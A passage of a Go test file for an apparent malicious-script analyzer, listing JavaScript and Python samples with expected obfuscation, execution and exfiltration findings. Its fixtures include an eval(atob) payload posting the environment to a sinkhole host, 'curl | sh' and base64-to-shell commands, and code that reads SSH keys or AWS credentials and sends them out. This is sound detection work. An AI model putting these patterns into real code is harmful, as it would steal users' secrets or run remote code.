package script_test

import (
	"context"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"math"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/mrdhira/galahad/internal/analyze"
	"github.com/mrdhira/galahad/internal/analyze/static/script"
	"github.com/mrdhira/galahad/internal/protocol"
)

// exfilPayload is harmless: the host is a sinkhole name that never resolves.
const exfilPayload = "const https = require('https');\n" +
	"const body = JSON.stringify(process.env);\n" +
	"https.request({ hostname: 'c2.sinkhole.test', method: 'POST' }).end(body);\n" +
	"// padding so that the encoded form is long enough to count as a blob....\n"

// Harmless probes of code that reads credential files for its own use.
const (
	notebookProbe = `import os, json
import requests
from pathlib import Path
KAGGLE = Path.home() / '.kaggle' / 'kaggle.json'
AWS = Path.home() / '.aws' / 'config'
region = 'us-east-1'
if AWS.exists():
    region = AWS.read_text().split('region = ')[-1].strip()
r = requests.get(f'https://api.test/data?region={region}')
df = r.json()
print(len(df))
`
	netrcProbe = `import netrc, os, requests
from pathlib import Path
def auth_for(host):
    rc = Path.home() / '.netrc'
    if not rc.exists():
        return None
    login, _, password = netrc.netrc(rc).authenticators(host)
    return (login, password)
def get(url):
    return requests.get(url, auth=auth_for('api.test'))
`
	awsIniProbe = `'use strict';
const { join } = require('path');
const { homedir } = require('os');
const { readFile } = require('fs/promises');
const http = require('http');
const getHomeDir = () => process.env.HOME || homedir();
const getCredentialsFilepath = () => process.env.AWS_SHARED_CREDENTIALS_FILE || join(getHomeDir(), '.aws', 'credentials');
const getConfigFilepath = () => process.env.AWS_CONFIG_FILE || join(getHomeDir(), '.aws', 'config');
const loadSharedConfigFiles = async () => ({
  configFile: await readFile(getConfigFilepath(), 'utf8').catch(() => ''),
  credentialsFile: await readFile(getCredentialsFilepath(), 'utf8').catch(() => ''),
});
// IMDS credential provider
const httpRequest = (options) => new Promise((resolve, reject) => {
  const req = http.request({ method: 'GET', ...options, hostname: '169.254.169.254' });
  req.on('response', (res) => { const chunks = []; res.on('data', (c) => chunks.push(c)); res.on('end', () => resolve(Buffer.concat(chunks))); });
  req.on('error', reject);
  req.end();
});
module.exports = { loadSharedConfigFiles, httpRequest };
`
)

// requesterProbe copies the shape of an HTTP requester that drops the proxy
// variables of the environment for one call and restores them afterwards.
const requesterProbe = `import os
import requests


class Requester:
    def __init__(self):
        self._http_requester = requests.Session()

    def get(self, url, **kwargs):
        return self._call_method("get", url, **kwargs)

    def _call_method(self, method, url, **kwargs):
        popped = False
        old_env = dict(os.environ)
        for var_name in ("http_proxy", "https_proxy", "no_proxy"):
            popped = True if os.environ.pop(var_name, None) else popped
            popped = True if os.environ.pop(var_name.upper(), None) else popped
        try:
            return getattr(self._http_requester, method)(url, **kwargs)
        finally:
            if popped:
                os.environ.clear()
                os.environ.update(old_env)
`

const (
	// A minified async function that reads a credential file and posts it.
	ev1o = `var a=require('path'),b=require('os'),c=require('fs');(async()=>{var d=c.readFileSync(a.join(b.homedir(),'.aws','credentials'));await fetch('https://c2.test/k',{method:'POST',body:d})})();
`
	// A test runner that evaluates its arguments next to a fetch.
	testRunnerProbe = `const http = require('http');
async function main() {
  const server = http.createServer((q, s) => s.end('ok'));
  await new Promise((r) => server.listen(0, r));
  await fetch('http://127.0.0.1:' + server.address().port);
  for (const expr of process.argv.slice(2)) {
    console.log(eval(expr));
  }
}
main();
`
)

func b64(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }

// unit returns n characters of base64 with 16 different characters.
func unit(n int) string { return strings.Repeat("aB3dE5fGhJ7kL9mN", n/16+1)[:n] }

const minifiedUnit = `!function(t){var e=Function("return this")()||this;function r(t){return String.fromCharCode.apply(null,t)}t.lib={r:r,g:e,s:setTimeout(function(){r([97])},0)}}(this);`

func pad(n int) string { return strings.Repeat(" ", n) }

// analyzeFile runs the analyzer and returns "<rule suffix>:<line>" of the primary evidence of each finding, sorted.
func analyzeFile(t *testing.T, path, data string) ([]string, analyze.Output) {
	t.Helper()
	return analyzeFileCtx(t, context.Background(), path, data)
}

func analyzeFileCtx(t *testing.T, ctx context.Context, path, data string) ([]string, analyze.Output) {
	t.Helper()
	f := analyze.File{Path: path, Name: path[strings.LastIndex(path, "/")+1:], Data: []byte(data)}
	out, err := script.New().Analyze(ctx, f)
	if err != nil {
		t.Fatal(err)
	}
	var got []string
	for _, fi := range out.Findings {
		got = append(got, fmt.Sprintf("%s:%d", strings.TrimPrefix(fi.RuleID, "GAL-"), fi.Evidence[0].Line))
	}
	slices.Sort(got)
	return got, out
}

func TestAnalyze(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		path string
		data string
		// expectations: "<rule without GAL->:<line>" of the primary evidence, sorted
		want []string
	}{
		{
			name: "hidden eval of an encoded payload that steals the environment",
			path: "index.js",
			data: "console.log(1);\n" + "run();" + pad(300) + "eval(atob('" + b64(exfilPayload) + "'));\n",
			want: []string{"EXFIL-001:2", "OBF-001:2", "OBF-002:2", "OBF-003:2"},
		},
		{name: "199 spaces are not padding", path: "a.js", data: "x();" + pad(199) + "y();\n"},
		{name: "200 spaces hide code", path: "a.js", data: "x();" + pad(200) + "y();\n", want: []string{"OBF-001:1"}},
		{name: "200 tabs hide code", path: "a.py", data: "x()" + strings.Repeat("\t", 200) + "y()\n", want: []string{"OBF-001:1"}},
		{name: "leading indent hides code", path: "a.ts", data: "\n" + pad(250) + "run();\n", want: []string{"OBF-001:2"}},
		{name: "trailing white space hides nothing", path: "a.js", data: "x();" + pad(400) + "\ny();\n"},
		{name: "padding before a control character is a table, not code", path: "a.js", data: "x();" + pad(300) + "\x02\x02\n"},
		{name: "padding after a closed block comment hides code", path: "a.js", data: "/* status */" + pad(300) + "eval(atob(x));\n", want: []string{"OBF-001:1", "OBF-002:1"}},
		{name: "code after the end of a block comment on a star line", path: "a.js", data: "/*\n*/ 0; eval(atob(x));\n", want: []string{"OBF-002:2"}},
		{name: "code inside a block comment line", path: "a.js", data: "/* eval(atob(x)); */\n * eval(atob(x));\n"},
		{name: "padding before a comment line is not code", path: "a.js", data: "// note" + pad(300) + "more\n"},
		{name: "python comment line", path: "a.py", data: "# note" + pad(300) + "more\n"},
		{name: "mjs", path: "a.mjs", data: "x();" + pad(200) + "y();\n", want: []string{"OBF-001:1"}},
		{name: "cjs", path: "a.cjs", data: "x();" + pad(200) + "y();\n", want: []string{"OBF-001:1"}},
		{name: "jsx", path: "a.jsx", data: "x();" + pad(200) + "y();\n", want: []string{"OBF-001:1"}},
		{name: "tsx", path: "a.tsx", data: "x();" + pad(200) + "y();\n", want: []string{"OBF-001:1"}},
		{name: "upper case extension", path: "A.JS", data: "x();" + pad(200) + "y();\n", want: []string{"OBF-001:1"}},
		{name: "other extensions are not scripts", path: "a.txt", data: "x();" + pad(200) + "y();\n"},
		{name: "empty file", path: "a.js", data: ""},
		{name: "member of a container", path: "lure.zip!/setup.js", data: "x();" + pad(200) + "y();\n", want: []string{"OBF-001:1"}},

		{name: "256 character blob", path: "a.js", data: "var k = '" + unit(256) + "';\n", want: []string{"OBF-003:1"}},
		{name: "255 character run is not a blob", path: "a.js", data: "var k = '" + strings.Repeat("aB3dE5fG", 31) + "aB3dE5f';\n"},
		{name: "run of one character is not a blob", path: "a.js", data: "// " + strings.Repeat("-", 300) + "\n"},
		{name: "long name without digits is not a blob", path: "a.js", data: "var " + strings.Repeat("Some_Long_Diagnostic_Message_", 12) + " = 1;\n"},
		{name: "blob of binary data is flagged but not decoded", path: "a.py", data: "ICON = '" + base64.StdEncoding.EncodeToString(binaryBytes(300)) + "'\n", want: []string{"OBF-003:1"}},
		{name: "image data URI is data", path: "a.js", data: "var i = 'data:image/png;base64," + base64.StdEncoding.EncodeToString(binaryBytes(300)) + "';\n"},
		{name: "script data URI is a blob", path: "a.js", data: "import('data:text/javascript;base64," + b64(strings.Repeat("// x\n", 60)) + "');\n", want: []string{"OBF-003:1"}},
		{name: "hex blob that decodes to text is checked again", path: "a.js", data: "var h = '" + hex.EncodeToString([]byte(exfilPayload)) + "';\n", want: []string{"EXFIL-001:1", "OBF-003:1"}},
		{name: "decoded text gets one pass only", path: "a.js", data: "var h = '" + b64(strings.Repeat("var x = 1;\n", 20)+b64(exfilPayload)) + "';\n", want: []string{"OBF-003:1", "OBF-003:1"}},
		{name: "blob that is not base64 or hex", path: "a.js", data: "var s = '" + strings.Repeat("ab cd ", 100) + "';\n"},

		{name: "eval of atob", path: "a.js", data: "eval(atob('aGk='));\n", want: []string{"OBF-002:1"}},
		{name: "new Function of atob", path: "a.js", data: "const f = new Function(atob(x));\n", want: []string{"OBF-002:1"}},
		{name: "eval of a base64 buffer", path: "a.js", data: "eval(Buffer.from(x, 'base64').toString());\n", want: []string{"OBF-002:1"}},
		{name: "eval of a hex buffer", path: "a.js", data: "eval(Buffer.from(x, 'hex').toString());\n", want: []string{"OBF-002:1"}},
		{name: "eval of char codes", path: "a.js", data: "eval(String.fromCharCode(97, 108));\n", want: []string{"OBF-002:1"}},
		{name: "eval of inflated data", path: "a.js", data: "eval(zlib.inflateSync(x).toString());\n", want: []string{"OBF-002:1"}},
		{name: "string timer of atob", path: "a.js", data: "setTimeout(atob(x), 10);\n", want: []string{"OBF-002:1"}},
		{name: "timer with a function is code", path: "a.js", data: "setTimeout(function () { return atob(x); }, 10);\n"},
		{name: "timer with an arrow function is code", path: "a.js", data: "setInterval(() => atob(x), 10);\n"},
		{name: "decoded variable reaches eval", path: "a.js", data: "const s = atob(x);\nwork();\neval(s);\n", want: []string{"OBF-002:3"}},
		{name: "variable assigned again is not decoded", path: "a.js", data: "let s = atob(x);\ns = 'alert(1)';\neval(s);\n"},
		{name: "python exec of b64decode", path: "a.py", data: "exec(base64.b64decode(x))\n", want: []string{"OBF-002:1"}},
		{name: "python exec of zlib and base64", path: "a.py", data: "exec(zlib.decompress(base64.b64decode(x)))\n", want: []string{"OBF-002:1"}},
		{name: "python exec of marshal", path: "a.py", data: "exec(marshal.loads(x))\n", want: []string{"OBF-002:1"}},
		{name: "python exec of hex", path: "a.py", data: "exec(bytes.fromhex(x))\n", want: []string{"OBF-002:1"}},
		{name: "python decoded variable reaches exec", path: "a.py", data: "code = base64.b64decode(x)\nexec(code)\n", want: []string{"OBF-002:2"}},
		{name: "python codecs decode with an encoding", path: "a.py", data: "exec(codecs.decode(x, 'base64'))\n", want: []string{"OBF-002:1"}},
		{name: "python rot13", path: "a.py", data: "exec(codecs.decode('vzcbeg bf', 'rot13'))\n", want: []string{"OBF-002:1"}},
		{name: "python codecs decode of text encoding", path: "a.py", data: "exec(codecs.decode(x, 'utf-8'))\n"},
		{name: "python codecs decode after a long blob", path: "a.py", data: "exec(codecs.decode('" + unit(900) + "', 'base64'))\n", want: []string{"OBF-002:1", "OBF-003:1"}},
		{name: "python decoder imported under another name", path: "a.py", data: "from base64 import b64decode as d\nexec(d(x))\n", want: []string{"OBF-002:2"}},
		{name: "python name that is not a decoder", path: "a.py", data: "from json import loads as d\nexec(d(x))\n"},
		{name: "js decoder assigned to another name", path: "a.js", data: "const d = atob;\neval(d(x));\n", want: []string{"OBF-002:2"}},
		{name: "js function assigned to another name", path: "a.js", data: "const d = parse;\neval(d(x));\n"},
		{name: "python exec of compiled source", path: "a.py", data: "exec(compile(src, 'x', 'exec'))\n"},
		{name: "python model.eval is not eval", path: "a.py", data: "model.eval()\nvalue = ast.literal_eval(text)\n"},
		{name: "eval of a literal", path: "a.js", data: "eval(\"var a = atob('x');\");\n"},
		{name: "Function of literals", path: "a.js", data: "var g = Function('return this')();\nvar h = Function('a', 'b', 'return a + b');\n"},
		{name: "regex exec is not a sink in js", path: "a.js", data: "var m = /a(b)/.exec(atob(x));\n"},
		{name: "minified library line", path: "lib.min.js", data: `!function(t){var e=Function("return this")()||this,n=(0,eval)("this");function r(t){return String.fromCharCode.apply(null,t)}function o(t){return"function"==typeof atob?atob(t):t}t.lib={r:r,o:o,g:e,n:n,s:setTimeout(function(){o("x")},0)}}(this);` + "\n"},
		{name: "download assigned then evaluated", path: "a.py", data: "code = requests.get(url).text\nexec(code)\n", want: []string{"EXEC-001:2"}},
		{name: "python download through an imported name", path: "a.py", data: "from urllib.request import urlopen as u\nexec(u(url).read())\n", want: []string{"EXEC-001:2"}},
		{name: "js download through a module name", path: "a.js", data: "const client = require('https');\neval(client.get(url));\n", want: []string{"EXEC-001:2"}},
		{name: "eval of a fetched body", path: "a.js", data: "eval(await (await fetch(url)).text());\n", want: []string{"EXEC-001:1"}},

		{name: "download piped to sh in a command string", path: "a.js", data: "const cp = require('child_process');\ncp.execSync('curl -fsSL https://x.sinkhole.test/i.sh | sh');\n", want: []string{"EXEC-001:2", "EXEC-002:2"}},
		{name: "decode piped to sh in a command string", path: "a.js", data: "const cp = require('child_process');\ncp.exec('echo aGk= | base64 -d | sh');\n", want: []string{"EXEC-002:2", "OBF-002:2"}},
		{name: "spawn without child_process is some other function", path: "a.js", data: "spawn('node');\nfork();\n"},
		{name: "destructured spawn", path: "a.js", data: "const { spawn } = require('child_process');\nspawn('ls');\n", want: []string{"EXEC-002:2"}},
		{name: "regex exec in a file that spawns", path: "a.js", data: "const cp = require('child_process');\nvar m = re.exec(text);\n"},
		{name: "python os.system", path: "a.py", data: "os.system('ls')\n", want: []string{"EXEC-002:1"}},
		{name: "python subprocess", path: "a.py", data: "subprocess.run(['ls'])\n", want: []string{"EXEC-002:1"}},
		{name: "commented out download", path: "a.py", data: "# curl https://x.sinkhole.test/i.sh | sh\n"},
		{name: "download in a block comment", path: "a.js", data: "/*\n * curl https://x.sinkhole.test/i.sh | sh\n */\n"},
		{name: "embedded package manifest scripts are data", path: "a.js", data: `var m={"scripts":{"up":"curl -o list.dat https://a.sinkhole.test/list.dat && ./gen.js"}};` + "\n"},
		{name: "list of PowerShell aliases", path: "a.py", data: "aliases = 'h history icm iex ihy ii ipal ipcsv ipmo ipsn irm ise iwmi iwr kill lp'\n"},
		{name: "method definition named exec", path: "a.js", data: "const cp = require('child_process');\nclass Cmd {\n  async exec (args) {\n    return 1;\n  }\n}\nfunction spawn(command) {\n}\n"},

		{name: "env file read and https request", path: "setup.js", data: "const fs = require('fs');\nconst https = require('https');\nconst env = fs.readFileSync('../.env', 'utf8');\nhttps.request({ hostname: 'c.sinkhole.test' }).end(env);\n", want: []string{"EXFIL-001:3"}},
		{name: "env file read and a request through an inline require", path: "setup.js", data: "const env = fs.readFileSync(\"../.env\");\nrequire(\"https\").request({ host: \"c.sinkhole.test\" }).end(env);\n", want: []string{"EXFIL-001:1"}},
		{name: "dotenv config is not a read", path: "a.js", data: "require('dotenv').config({ path: '.env' });\nfetch(url);\n"},
		{name: "env example is not a secret", path: "a.js", data: "const t = fs.readFileSync('.env.example', 'utf8');\nfetch(url);\n"},
		{name: "env file mentioned without a read", path: "a.js", data: "const name = '.env';\nfetch(url);\n"},
		{name: "NODE_ENV and fetch", path: "a.js", data: "const prod = process.env.NODE_ENV === 'production';\nfetch(url);\n"},
		{name: "request through a module name", path: "a.js", data: "const fs = require('fs');\nconst client = require('https');\nconst env = fs.readFileSync('.env', 'utf8');\nclient.request(o).end(env);\n", want: []string{"EXFIL-001:3"}},
		{name: "request through a destructured require", path: "a.js", data: "const { request } = require('node:https');\nconst env = fs.readFileSync('.env', 'utf8');\nrequest(o).end(env);\n", want: []string{"EXFIL-001:2"}},
		{name: "request through a named import", path: "a.mjs", data: "import { readFileSync } from 'node:fs';\nimport { request as send } from 'node:https';\nconst env = readFileSync('.env', 'utf8');\nsend(o).end(env);\n", want: []string{"EXFIL-001:3"}},
		{name: "request through a default import", path: "a.mjs", data: "import https from 'https';\nconst env = readFileSync('.env', 'utf8');\nhttps.request(o).end(env);\n", want: []string{"EXFIL-001:2"}},
		{name: "request through a namespace import", path: "a.mjs", data: "import * as net from 'net';\nconst env = readFileSync('.env', 'utf8');\nnet.connect(80).end(env);\n", want: []string{"EXFIL-001:2"}},
		{name: "module that is not a network module", path: "a.js", data: "const c = require('fs');\nconst env = c.readFileSync('.env', 'utf8');\nc.get(env);\n"},
		{name: "method with the name of an imported function", path: "a.js", data: "const { request } = require('https');\nconst env = fs.readFileSync('.env', 'utf8');\nobj.request(env);\n"},
		{name: "python import as", path: "a.py", data: "import requests as r\nr.post(url, data=open('.env').read())\n", want: []string{"EXFIL-001:2"}},
		{name: "python from import", path: "a.py", data: "from requests import post\npost(url, data=open('.env').read())\n", want: []string{"EXFIL-001:2"}},
		{name: "python from import as", path: "a.py", data: "from urllib.request import urlopen as u\nu(url, open('.env').read())\n", want: []string{"EXFIL-001:2"}},
		{name: "python module imported from its package", path: "a.py", data: "from urllib import request\nrequest.urlopen(url, open('.env').read())\n", want: []string{"EXFIL-001:2"}},
		{name: "python socket as", path: "a.py", data: "import socket as s\ns.socket().sendall(open('.env', 'rb').read())\n", want: []string{"EXFIL-001:2"}},
		{name: "python name that is not a network call", path: "a.py", data: "from os.path import join as post\npost(url, open('.env').read())\n"},
		{name: "spread of the environment", path: "a.js", data: "const body = JSON.stringify({ ...process.env });\nfetch(url, { method: 'POST', body });\n", want: []string{"EXFIL-001:1"}},
		{name: "environment keys", path: "a.js", data: "const pairs = Object.entries(process.env).map(([k, v]) => k + v);\nfetch(url, { body: pairs });\n", want: []string{"EXFIL-001:1"}},
		{name: "environment kept in a variable", path: "a.js", data: "const e = process.env;\nfetch(url, { body: JSON.stringify(e) });\n", want: []string{"EXFIL-001:1"}},
		{name: "environment passed as a child option", path: "a.js", data: "run(cmd, { env: process.env });\nfetch(url);\n"},
		{name: "environment spread into a child option", path: "a.js", data: "run(cmd, { env: { ...process.env, A: 1 } });\nfetch(url);\n"},
		{name: "environment destructured", path: "a.js", data: "const { NODE_ENV: mode } = process.env\nfetch(url);\n"},
		{name: "environment keys only", path: "a.js", data: "const names = Object.keys(process.env);\nfetch(url, { body: names });\n"},
		{name: "environment kept in a variable that the request does not use", path: "a.js", data: "const e = process.env;\nfetch(url, { body: other });\n"},
		{name: "environment compared", path: "a.js", data: "if (x == process.env) {}\nfetch(url);\n"},
		{name: "env parameter is not a dump", path: "a.js", data: "module.exports = (env) => ({ mode: env });\nfetch(url);\n"},
		{name: "api key and fetch", path: "a.js", data: "const key = process.env.API_KEY;\nfetch(url, { headers: { key } });\n", want: []string{"EXFIL-002:1"}},
		{name: "api key and fetch on one line", path: "a.js", data: "fetch(url, { headers: { key: process.env.API_KEY } });\n", want: []string{"EXFIL-002:1"}},
		{name: "api key without network", path: "a.js", data: "const key = process.env.API_KEY;\n"},
		{name: "environment dump next to a request", path: "a.js", data: "const d = JSON.stringify(process.env);\nfetch(url, { method: 'POST', body: d });\n", want: []string{"EXFIL-001:1"}},
		{name: "environment dump far from the request", path: "a.js", data: "const d = JSON.stringify(process.env);\n" + strings.Repeat("work();\n", 120) + "fetch(url, { body: d });\n"},
		{name: "python environment dump and requests", path: "a.py", data: "data = dict(os.environ)\nrequests.post(url, json=data)\n", want: []string{"EXFIL-001:1"}},
		{name: "python environment copy sent in a request", path: "a.py", data: "env = os.environ.copy()\nrequests.post(url, data=env)\n", want: []string{"EXFIL-001:1"}},
		{name: "python environment copy kept for a child", path: "a.py", data: "env = os.environ.copy()\nsubprocess.run(cmd, env=env)\nrequests.get(url)\n", want: []string{"EXEC-002:2"}},
		{name: "python environment copy far from a request", path: "a.py", data: "env = os.environ.copy()\n" + strings.Repeat("work()\n", 120) + "requests.get(url)\n"},
		{name: "python environment as request data", path: "a.py", data: "requests.post(url, data=os.environ)\n", want: []string{"EXFIL-001:1"}},
		{name: "python environment unpacked", path: "a.py", data: "body = json.dumps({**os.environ})\nurllib.request.urlopen(url, body)\n", want: []string{"EXFIL-001:1"}},
		{name: "python environment variable as data", path: "a.py", data: "requests.post(url, data=os.environ['HOME'])\n"},
		{name: "python json dump of the environment", path: "a.py", data: "body = json.dumps(dict(os.environ))\nurllib.request.urlopen(url, body)\n", want: []string{"EXFIL-001:1"}},
		{name: "aws credentials and requests", path: "a.py", data: "p = os.path.expanduser('~/.aws/credentials')\nrequests.post(url, data=open(p).read())\n", want: []string{"EXFIL-001:1"}},
		{name: "ssh key and socket", path: "a.py", data: "key = open(home + '/.ssh/id_rsa').read()\ns = socket.socket()\n", want: []string{"EXFIL-001:1"}},
		{name: "credential path without network", path: "a.py", data: "key = open(home + '/.ssh/id_rsa').read()\n"},
		{name: "credential path far from the network use", path: "a.py", data: "key = open(home + '/.ssh/id_rsa').read()\n" + strings.Repeat("work()\n", 150) + "requests.get(url)\n"},
		{name: "credential path in help text and scp in prose", path: "a.py", data: "help = 'copy ~/.ssh/id_rsa to the host, then scp the files'\n"},
		{name: "credential path in an scp command", path: "a.py", data: "run('scp -r ~/.ssh/id_rsa user@host.sinkhole.test:/tmp')\n", want: []string{"EXFIL-001:1"}},
		{name: "credential file read far from the request that sends it", path: "a.js", data: "const stolen = fs.readFileSync(path.join(os.homedir(), '.aws', 'credentials'));\n" + strings.Repeat("work();\n", 150) + "fetch(url, { method: 'POST', body: stolen });\n", want: []string{"EXFIL-001:1"}},
		{name: "python credential file read far from the request that sends it", path: "a.py", data: "secret = open(os.path.expanduser('~/.aws/credentials')).read()\n" + strings.Repeat("work()\n", 150) + "requests.post(url, data=secret)\n", want: []string{"EXFIL-001:1"}},
		{name: "credential file passed on far from the request", path: "a.py", data: "secret = open(os.path.expanduser('~/.aws/credentials')).read()\nbundle = [secret]\n" + strings.Repeat("work()\n", 150) + "requests.post(url, data=bundle)\n", want: []string{"EXFIL-001:1"}},
		{name: "credential file far from a request that does not use it", path: "a.py", data: "secret = open(os.path.expanduser('~/.aws/credentials')).read()\n" + strings.Repeat("work()\n", 150) + "requests.post(url, data=other)\n"},
		{name: "credential path in a docstring far from a request", path: "a.py", data: "\"\"\"Reads $HOME/.docker/config.json if present.\"\"\"\n" + strings.Repeat("work()\n", 150) + "requests.post(url, data=other)\n"},
		{name: "credential file with a short variable name far from a request", path: "a.js", data: "const k = fs.readFileSync(path.join(os.homedir(), '.aws', 'credentials'));\n" + strings.Repeat("work();\n", 150) + "fetch(url, { body: k });\n"},
		{name: "fetch as a method of another object", path: "a.js", data: "const key = process.env.API_KEY;\nfetcher.fetch(url);\n"},
		{name: "fetch as a method of window", path: "a.js", data: "const key = process.env.API_KEY;\nwindow.fetch(url);\n", want: []string{"EXFIL-002:1"}},
		{name: "fetch definition", path: "a.js", data: "const key = process.env.API_KEY;\nasync function fetch(url) {\n}\n"},
		{name: "fetch without secrets", path: "a.js", data: "fetch('https://api.example.test/items').then((r) => r.json());\n"},
		{name: "secret shell variable and curl in a command", path: "a.js", data: "run('curl -H \"X-Key: $API_TOKEN\" https://a.sinkhole.test');\n", want: []string{"EXFIL-002:1"}},
		{name: "env dump piped on by a command", path: "a.js", data: "run('env | curl -d @- https://a.sinkhole.test');\n", want: []string{"EXFIL-001:1"}},
		{name: "network use in a comment", path: "a.js", data: "const d = JSON.stringify(process.env);\n// fetch(url)\n"},
		{name: "secret read after a block comment on one line", path: "a.js", data: "/* config loader */ const env = require('fs').readFileSync('.env'); require('https').request(o).end(env);\n", want: []string{"EXFIL-001:1"}},

		{name: "credential directory joined from the home directory", path: "a.js", data: "const dir = path.join(os.homedir(), '.ssh');\nconst names = fs.readdirSync(dir);\nfetch(url, { method: 'POST', body: names });\n", want: []string{"EXFIL-001:1"}},
		{name: "ssh private key joined from segments", path: "a.js", data: "const k = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_ed25519'));\nfetch(url, { method: 'POST', body: k });\n", want: []string{"EXFIL-001:1"}},
		{name: "ssh private key resolved from segments", path: "a.js", data: "const k = fs.readFileSync(path.resolve(os.homedir(), '.ssh', 'id_rsa'));\nfetch(url, { method: 'POST', body: k });\n", want: []string{"EXFIL-001:1"}},
		{name: "ssh private key in a template literal", path: "a.js", data: "const k = fs.readFileSync(`${os.homedir()}/.ssh/id_ecdsa`);\nfetch(url, { method: 'POST', body: k });\n", want: []string{"EXFIL-001:1"}},
		{name: "ssh private key with the pathlib operator", path: "a.py", data: "k = Path.home() / '.ssh' / 'id_rsa'\nrequests.post(url, data=k.read_text())\n", want: []string{"EXFIL-001:1"}},
		{name: "ssh directory glob", path: "a.py", data: "keys = glob.glob(os.path.expanduser('~/.ssh/*'))\nrequests.post(url, data=str(keys))\n", want: []string{"EXFIL-001:1"}},
		{name: "ssh config joined from segments", path: "a.js", data: "const c = fs.readFileSync(path.join(os.homedir(), '.ssh', 'config'), 'utf8');\nfetch(url, { method: 'POST', body: c });\n"},
		{name: "ssh config resolved from segments", path: "a.js", data: "const c = fs.readFileSync(path.resolve(os.homedir(), '.ssh', 'config'), 'utf8');\nfetch(url, { method: 'POST', body: c });\n"},
		{name: "ssh config concatenated", path: "a.js", data: "const c = fs.readFileSync(os.homedir() + '/.ssh/config', 'utf8');\nfetch(url, { method: 'POST', body: c });\n"},
		{name: "ssh config in a template literal", path: "a.js", data: "const c = fs.readFileSync(`${os.homedir()}/.ssh/config`, 'utf8');\nfetch(url, { method: 'POST', body: c });\n"},
		{name: "ssh config with the pathlib operator", path: "a.py", data: "c = Path.home() / '.ssh' / 'config'\nrequests.post(url, data=c.read_text())\n"},
		{name: "ssh known_hosts joined from segments", path: "a.js", data: "const h = fs.readFileSync(path.join(os.homedir(), '.ssh', 'known_hosts'), 'utf8');\nfetch(url, { method: 'POST', body: h });\n"},
		{name: "ssh authorized_keys joined from segments", path: "a.js", data: "const h = fs.readFileSync(path.join(os.homedir(), '.ssh', 'authorized_keys'), 'utf8');\nfetch(url, { method: 'POST', body: h });\n"},
		{name: "ssh public key joined from segments", path: "a.js", data: "const p = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa.pub'), 'utf8');\nfetch(url, { method: 'POST', body: p });\n"},
		{name: "ssh public key concatenated", path: "a.js", data: "const p = fs.readFileSync(os.homedir() + '/.ssh/id_ed25519.pub', 'utf8');\nfetch(url, { method: 'POST', body: p });\n"},
		{name: "credential path resolved from segments", path: "a.js", data: "const f = fs.readFileSync(path.resolve(os.homedir(), '.aws', 'credentials'));\nfetch(url, { method: 'POST', body: f });\n", want: []string{"EXFIL-001:1"}},
		{name: "npm token file joined from segments is not counted", path: "a.js", data: "const rc = fs.readFileSync(path.join(os.homedir(), `.npmrc`), 'utf8');\nfetch(url, { body: rc });\n"},
		{name: "python credential path joined from segments", path: "a.py", data: "p = os.path.join(os.path.expanduser('~'), '.aws', 'credentials')\nrequests.post(url, data=open(p).read())\n", want: []string{"EXFIL-001:1"}},
		{name: "python pathlib credential path", path: "a.py", data: "cfg = Path.home() / '.kube' / 'config'\nrequests.post(url, data=cfg.read_text())\n", want: []string{"EXFIL-001:1"}},
		{name: "python pathlib netrc is not counted", path: "a.py", data: "rc = (Path.home() / \".netrc\").read_text()\nrequests.post(url, data=rc)\n"},
		{name: "env file read from joined segments", path: "a.js", data: "const e = fs.readFileSync(path.join(root, '.env'), 'utf8');\nfetch(url, { body: e });\n", want: []string{"EXFIL-001:1"}},
		{name: "env example joined from segments", path: "a.js", data: "const t = fs.readFileSync(path.join(__dirname, '.env.example'), 'utf8');\nfetch(url);\n"},
		{name: "env file joined but not read", path: "a.js", data: "const p = path.join(__dirname, '.env');\nfetch(url);\n"},
		{name: "dotenv config with a joined env path", path: "a.js", data: "require('dotenv').config({ path: path.join(root, '.env') });\nfetch(url);\n"},
		{name: "credential directory names in a list", path: "a.js", data: "const dirs = ['.ssh', '.aws'];\nfetch(url);\n"},
		{name: "tool reads its own npm config without network", path: "a.js", data: "const rc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');\nconsole.log(rc);\n"},
		{name: "notebook reads the aws config file and calls an API", path: "analysis.py", data: notebookProbe},
		{name: "auth helper reads the netrc file and calls an API", path: "auth.py", data: netrcProbe},
		{name: "aws config loader that only defines where its files live", path: "index.js", data: awsIniProbe, want: []string{"EXFIL-002:7", "EXFIL-002:8"}},
		{name: "kube config joined from segments", path: "a.js", data: "const c = fs.readFileSync(path.join(os.homedir(), '.kube', 'config'));\nfetch(url, { body: c });\n", want: []string{"EXFIL-001:1"}},
		{name: "docker config joined from segments", path: "a.js", data: "const c = fs.readFileSync(path.join(os.homedir(), '.docker', 'config.json'));\nfetch(url, { body: c });\n", want: []string{"EXFIL-001:1"}},
		{name: "gnupg directory joined from segments", path: "a.js", data: "const ring = fs.readdirSync(path.join(os.homedir(), '.gnupg'));\nfetch(url, { body: ring });\n", want: []string{"EXFIL-001:1"}},
		{name: "aws config file joined from segments", path: "a.js", data: "const c = fs.readFileSync(path.join(os.homedir(), '.aws', 'config'));\nfetch(url, { body: c });\n"},
		{name: "docker plugin directory joined from segments", path: "a.js", data: "const c = fs.readdirSync(path.join(os.homedir(), '.docker', 'cli-plugins'));\nfetch(url, { body: c });\n"},
		{name: "credential path joined over several lines", path: "a.js", data: "const f = fs.readFileSync(path.join(\n  os.homedir(),\n  '.aws',\n  'credentials',\n));\nfetch(url, { body: f });\n", want: []string{"EXFIL-001:3"}},
		{name: "python credential path joined over several lines", path: "a.py", data: "p = os.path.join(\n    os.path.expanduser('~'),\n    '.aws', 'credentials')\nrequests.post(url, data=open(p).read())\n", want: []string{"EXFIL-001:3"}},
		{name: "python joinpath", path: "a.py", data: "p = Path.home().joinpath('.aws', 'credentials')\nrequests.post(url, data=p.read_text())\n", want: []string{"EXFIL-001:1"}},
		{name: "python pathlib operator at the end of a line", path: "a.py", data: "p = (Path.home() /\n     '.gnupg')\nrequests.post(url, data=list(p.iterdir()))\n", want: []string{"EXFIL-001:2"}},
		{name: "path closed before the directory name", path: "a.js", data: "const f = fs.readFileSync(path.join(a, b), '.ssh');\nfetch(url, { body: f });\n"},
